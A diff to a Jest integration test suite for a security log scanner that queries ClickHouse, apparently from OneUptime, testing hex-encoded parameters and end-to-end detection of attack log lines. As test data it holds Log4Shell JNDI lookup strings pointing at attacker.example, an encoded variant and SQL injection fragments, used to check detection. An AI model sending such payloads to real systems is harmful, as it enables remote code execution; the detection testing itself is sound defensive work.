@@ -4,7 +4,9 @@ import { ClickHouseClientConfigOptions } from "Common/Server/Infrastructure/Clic
 import ClickhouseDatabase, {
   ClickhouseClient,
 } from "Common/Server/Infrastructure/ClickhouseDatabase";
-import { TelemetryServiceMetadata } from "Common/Server/Services/OpenTelemetryIngestService";
+import OTelIngestService, {
+  TelemetryServiceMetadata,
+} from "Common/Server/Services/OpenTelemetryIngestService";
 import {
   SQL,
   Statement,
@@ -36,25 +38,32 @@ import {
   jest,
   test,
 } from "@jest/globals";
+import { createHash } from "crypto";
 
 /*
  * ------------------------------------------------------------------
  * The security scans' queries against a real ClickHouse server (#6419).
  *
  * The scans send the words they look for hex encoded - unhex({p0:String}),
- * [unhex({p1_0:String}), ...] - so that ClickHouse's own records of a
- * query never hold them: a failed query's error line ("(in query: ...)")
- * was shipped back as a log and read as a Log4Shell attempt from
- * ClickHouse's version. Common's suites pin the statements; this one
- * shows what ClickHouse makes of them, with both analyzers:
+ * CAST(unhex({p1:String}), 'Array(String)') - so that ClickHouse's own
+ * records of a query never hold them: a failed query's error line ("(in
+ * query: ...)") was shipped back as a log and read as a Log4Shell attempt
+ * from ClickHouse's version. An array is one parameter however long it is:
+ * sent a parameter an element, the log scan's read passed the 1,000 fields
+ * ClickHouse 26.7 takes in a request and read nothing (#10520). Common's
+ * suites pin the statements; this one shows what ClickHouse makes of them,
+ * with both analyzers:
  *
  *   - the log scan's read returns exactly the lines the prefilter, read in
  *     JavaScript, says it should;
  *   - each operator a statement uses on hex encoded text reads what it did
  *     on the text as written;
+ *   - an array decodes byte for byte, a long one sent in pieces too;
  *   - the Log4Shell rule of the library finds the event it should;
  *   - a scan query that fails leaves no scan word in system.query_log or
- *     system.text_log, while the same query sent as written does.
+ *     system.text_log, while the same query sent as written does;
+ *   - and "Your logs" itself, the scan of a window, stores an event for
+ *     each attack line it reads.
  *
  * Opt in locally by pointing TEST_CLICKHOUSE_URL at a disposable server:
  *
@@ -82,7 +91,23 @@ jest.mock("Common/Server/Utils/Logger", () => {
 
 import LogService from "Common/Server/Services/LogService";
 import SecurityEventService from "Common/Server/Services/SecurityEventService";
+import SecurityLogSourceService from "Common/Server/Services/SecurityLogSourceService";
+import SecurityLogCases from "Common/Server/Utils/SecurityCase/SecurityLogCases";
+import SecurityAddressVaultLookup from "Common/Server/Utils/SecurityEvent/AddressVault/SecurityAddressVaultLookup";
+import OpenStackAuditJoin from "Common/Server/Utils/SecurityEvent/LogScan/OpenStackAuditJoin";
+import SecurityLogScanner, {
+  SecurityLogScanResult,
+} from "Common/Server/Utils/SecurityEvent/LogScan/SecurityLogScanner";
+import RealTimeDetections from "Common/Server/Utils/SecurityEvent/RealTime/RealTimeDetections";
+import SecurityRequestTrace from "Common/Server/Utils/SecurityEvent/RequestTrace/SecurityRequestTrace";
+import ScrubbedClientAddresses from "Common/Server/Utils/SecurityEvent/ScrubbedClientAddresses";
+import SecurityEventStoreOnce from "Common/Server/Utils/SecurityEvent/SecurityEventStoreOnce";
+import SecurityTrustedProxies from "Common/Server/Utils/SecurityEvent/SecurityTrustedProxies";
+import { NO_TRUSTED_PROXIES } from "Common/Utils/SecurityEvent/ClientAddressTrust";
 import SigmaClickhouseCompiler from "Common/Server/Utils/SecurityEvent/Sigma/SigmaClickhouseCompiler";
+import ThreatIntelEnricher from "Common/Server/Utils/SecurityEvent/ThreatIntel/ThreatIntelEnricher";
+import SecurityLogSource from "Common/Models/DatabaseModels/SecurityLogSource";
+import { SECURITY_LOG_ID_ATTRIBUTE } from "Common/Types/SecurityEvent/SecurityLogFormat";
 
 const endpoint: string | undefined = process.env["TEST_CLICKHOUSE_URL"];
 
@@ -447,9 +472,11 @@ integration("The security scans' queries against ClickHouse", () => {
       const statement: Statement = await captureLogScanRead();
 
       expect(statement.query).toContain(
-        "multiSearchAnyCaseInsensitive(body, [unhex({p",
+        "multiSearchAnyCaseInsensitive(body, CAST(unhex({p",
       );
       expect(wordsIn(statement.query)).toEqual([]);
+      // A parameter for each list of words, well under the 1,000 fields ClickHouse 26.7 takes (#10520).
+      expect(Object.keys(statement.query_params).length).toBeLessThan(250);
 
       const rows: Array<JSONObject> = await rowsOf(statement, settings);
       const read: Array<string> = rows
@@ -539,6 +566,12 @@ integration("The security scans' queries against ClickHouse", () => {
           ids: ["sqlInjection"],
         },
         {
+          // As the flow scan writes it: IN (<the list>).
+          name: "in, the list in parentheses",
+          condition: SQL`body IN (${texts([BODIES["log4Shell"]!, BODIES["pathTraversal"]!])})`,
+          ids: ["log4Shell", "pathTraversal"],
+        },
+        {
           name: "has",
           condition: SQL`has(${texts([BODIES["sqlInjection"]!, "union select"])}, body)`,
           ids: ["sqlInjection"],
@@ -589,6 +622,116 @@ integration("The security scans' queries against ClickHouse", () => {
           ids: [...item.ids].sort(),
         });
       }
+    });
+
+    test("an array decodes byte for byte, every character as it was given (#10520)", async () => {
+      const values: Array<string> = [
+        "${jndi:",
+        "",
+        "'",
+        "''",
+        "\\",
+        "\\'",
+        "'\\",
+        "\\N",
+        "\\x41",
+        "it's",
+        "a,b",
+        "[x]",
+        "\u0000",
+        "\t\n\r",
+        "Ünïcode ${jndi:ldap://例え.example/ä} — 日本 🙂",
+        ...Array.from(
+          { length: 127 },
+          (_value: unknown, index: number): string => {
+            return `<${String.fromCharCode(index + 1)}>`;
+          },
+        ),
+      ];
+      const statement: Statement = SQL`SELECT arrayMap(x -> hex(x), ${{
+        type: TableColumnType.ArrayText,
+        value: values,
+      }}) AS decoded`;
+
+      // One parameter, whatever the array holds.
+      expect(Object.keys(statement.query_params)).toEqual(["p0"]);
+
+      const rows: Array<JSONObject> = await rowsOf(statement, settings);
+
+      expect(rows[0]!["decoded"]).toEqual(
+        values.map((value: string): string => {
+          return Buffer.from(value, "utf8").toString("hex").toUpperCase();
+        }),
+      );
+    });
+
+    test("a list and a text too long for one parameter go in pieces, and the server reads them whole", async () => {
+      const words: Array<string> = [
+        ...Array.from(
+          { length: 6000 },
+          (_value: unknown, index: number): string => {
+            return `\${jndi:ldap://attacker.example/${index}`;
+          },
+        ),
+        BODIES["log4Shell"]!,
+      ];
+      // A character of three bytes is cut where the first piece ends.
+      const long: string = `\${jndi:${"日".repeat(30000)}`;
+      const statement: Statement = SQL`WITH ${{
+        type: TableColumnType.ArrayText,
+        value: words,
+      }} AS words, ${{
+        type: TableColumnType.Text,
+        value: long,
+      }} AS long SELECT _id, length(words) AS elements, words[1] AS first, words[-1] AS last, length(long) AS longBytes, hex(MD5(long)) AS longDigest FROM `;
+      statement.append(`${database}.${new Log().tableName}`);
+      statement.append(
+        SQL` WHERE projectId = ${{
+          type: TableColumnType.ObjectID,
+          value: projectId,
+        }} AND has(words, body) ORDER BY _id`,
+      );
+
+      const names: Array<string> = Object.keys(statement.query_params);
+
+      expect(
+        names.filter((name: string): boolean => {
+          return name.startsWith("p0_");
+        }).length,
+      ).toBeGreaterThan(1);
+      expect(
+        names.filter((name: string): boolean => {
+          return name.startsWith("p1_");
+        }).length,
+      ).toBeGreaterThan(1);
+
+      for (const value of Object.values(statement.query_params)) {
+        expect(String(value).length).toBeLessThanOrEqual(128 * 1024);
+      }
+
+      const rows: Array<JSONObject> = await rowsOf(statement, settings);
+
+      expect(
+        rows.map((row: JSONObject): JSONObject => {
+          return {
+            ...row,
+            elements: Number(row["elements"]),
+            longBytes: Number(row["longBytes"]),
+          };
+        }),
+      ).toEqual([
+        {
+          _id: "log4Shell",
+          elements: words.length,
+          first: words[0],
+          last: BODIES["log4Shell"],
+          longBytes: Buffer.byteLength(long, "utf8"),
+          longDigest: createHash("md5")
+            .update(Buffer.from(long, "utf8"))
+            .digest("hex")
+            .toUpperCase(),
+        },
+      ]);
     });
 
     test("the library's Log4Shell rule finds the lookups, and nothing else", async () => {
@@ -685,6 +828,181 @@ integration("The security scans' queries against ClickHouse", () => {
       expect(wordsIn(records.join("\n"))).toEqual(
         expect.arrayContaining(["${jndi:", "%24%7bjndi", "union select"]),
       );
+    });
+  });
+
+  /*
+   * "Your logs" itself (#10520): a scan of a window
+   * (SecurityLogScanner.scanSource) - its read on this server, each line's
+   * parse, the events stored in the SecurityEvent table - read back here.
+   * Only what lives in Postgres and Redis is stood in for: the source's own
+   * row, the "OneUptime Logs" service, cases, the project's trusted proxies,
+   * the enrichments that read them, and the product lock.
+   */
+  describe("Your logs, end to end", () => {
+    const scanProjectId: ObjectID = new ObjectID(
+      "64190000-0000-4000-8000-00000000000d",
+    );
+
+    test("a scan of the window reads the attack lines, and stores an event for each", async () => {
+      const scanNow: Date = new Date();
+      const atMinutesAgo: (minutes: number) => string = (
+        minutes: number,
+      ): string => {
+        return OneUptimeDate.toClickhouseDateTime(
+          new Date(scanNow.getTime() - minutes * 60 * 1000),
+        );
+      };
+
+      await client.insert({
+        table: `${database}.${new Log().tableName}`,
+        values: Object.entries(BODIES).map(
+          ([id, body]: [string, string]): JSONObject => {
+            return {
+              _id: `scan-${id}`,
+              projectId: scanProjectId.toString(),
+              primaryEntityId: SERVICE_METADATA.primaryEntityId.toString(),
+              primaryEntityType: "Service",
+              time: atMinutesAgo(3),
+              timeUnixNano: `${scanNow.getTime() - 3 * 60 * 1000}000000`,
+              severityText: "Information",
+              severityNumber: 9,
+              attributes: {},
+              attributeKeys: [],
+              body: body,
+              retentionDate: OneUptimeDate.toClickhouseDateTime(
+                OneUptimeDate.addRemoveDays(scanNow, 30),
+              ),
+              // Arrived two minutes ago: in the window, and settled.
+              createdAt: atMinutesAgo(2),
+            };
+          },
+        ),
+        format: "JSONEachRow",
+      });
+
+      const sourceUpdates: Array<JSONObject> = [];
+
+      jest
+        .spyOn(SecurityLogSourceService, "updateOneById")
+        .mockImplementation((async (data: {
+          data: JSONObject;
+        }): Promise<void> => {
+          sourceUpdates.push(data.data);
+        }) as never);
+      jest
+        .spyOn(OTelIngestService, "telemetryServiceFromName")
+        .mockResolvedValue(SERVICE_METADATA as never);
+      jest
+        .spyOn(SecurityLogCases, "recordThreats")
+        .mockResolvedValue({ casesOpened: 0, detections: 0 } as never);
+      jest
+        .spyOn(OpenStackAuditJoin, "enrichEvents")
+        .mockResolvedValue(undefined as never);
+      jest
+        .spyOn(SecurityRequestTrace, "followEvents")
+        .mockResolvedValue(undefined as never);
+      jest
+        .spyOn(SecurityAddressVaultLookup, "nameHashedAddresses")
+        .mockResolvedValue(undefined as never);
+      jest
+        .spyOn(ScrubbedClientAddresses, "nameScrubRules")
+        .mockResolvedValue(undefined as never);
+      jest
+        .spyOn(ThreatIntelEnricher, "enrichNormalizedEvents")
+        .mockResolvedValue({ eventsMatched: 0, valuesLookedUp: 0 } as never);
+      jest
+        .spyOn(RealTimeDetections, "screen")
+        .mockResolvedValue(undefined as never);
+      jest
+        .spyOn(SecurityEventStoreOnce, "withProductLock")
+        .mockImplementation((async (data: {
+          work: () => Promise<unknown>;
+        }): Promise<unknown> => {
+          return await data.work();
+        }) as never);
+      jest
+        .spyOn(SecurityTrustedProxies, "getForProject")
+        .mockResolvedValue(NO_TRUSTED_PROXIES as never);
+
+      const source: SecurityLogSource = new SecurityLogSource();
+      source.id = new ObjectID("64190000-0000-4000-8000-00000000000e");
+      source.projectId = scanProjectId;
+      source.cursor = new Date(scanNow.getTime() - 4 * 60 * 1000).toISOString();
+      source.lastScanResult = {};
+
+      const result: SecurityLogScanResult =
+        await SecurityLogScanner.scanSource(source);
+
+      // The lines the prefilter reads, and the log each of their events names.
+      const candidates: Array<[string, string]> = Object.entries(BODIES).filter(
+        ([, body]: [string, string]): boolean => {
+          return matchesSecurityLogPrefilter(body);
+        },
+      );
+      const expectedLogIds: Array<string> = candidates.flatMap(
+        ([id, body]: [string, string]): Array<string> => {
+          return SecurityLogParser.parse({
+            body,
+            attributes: {},
+            time: new Date(),
+            logId: `scan-${id}`,
+          }).map((): string => {
+            return `scan-${id}`;
+          });
+        },
+      );
+
+      expect(result.logsRead).toBe(candidates.length);
+      expect(result.eventsFound).toBe(expectedLogIds.length);
+      expect(sourceUpdates).toHaveLength(1);
+      expect(sourceUpdates[0]!["lastError"]).toBeNull();
+      expect(sourceUpdates[0]!["cursor"]).not.toBe(source.cursor);
+
+      await client.command({ query: "SYSTEM FLUSH ASYNC INSERT QUEUE" });
+
+      const read: Statement = SQL`SELECT attributes[${{
+        type: TableColumnType.Text,
+        value: SECURITY_LOG_ID_ATTRIBUTE,
+      }}] AS logId FROM `;
+      read.append(`${database}.${new SecurityEvent().tableName}`);
+      read.append(
+        SQL` WHERE projectId = ${{
+          type: TableColumnType.ObjectID,
+          value: scanProjectId,
+        }} ORDER BY logId`,
+      );
+
+      const storedLogIds: Array<string> = (await rowsOf(read)).map(
+        (row: JSONObject): string => {
+          return String(row["logId"]);
+        },
+      );
+
+      expect(storedLogIds).toEqual([...expectedLogIds].sort());
+      // The attack lines, each found again; the lines with no attack, never.
+      expect(storedLogIds).toEqual(
+        expect.arrayContaining([
+          "scan-sshFailed",
+          "scan-log4Shell",
+          "scan-log4ShellEncoded",
+          "scan-sqlInjection",
+          "scan-pathTraversal",
+          "scan-cefBlocked",
+          "scan-kubernetesForbidden",
+          "scan-cloudTrailError",
+        ]),
+      );
+
+      for (const quiet of [
+        "scan-ordinary",
+        "scan-loggedOut",
+        "scan-kubernetesByNode",
+        "scan-cloudTrailRead",
+        "scan-oldEcho",
+      ]) {
+        expect(storedLogIds).not.toContain(quiet);
+      }
     });
   });
 });
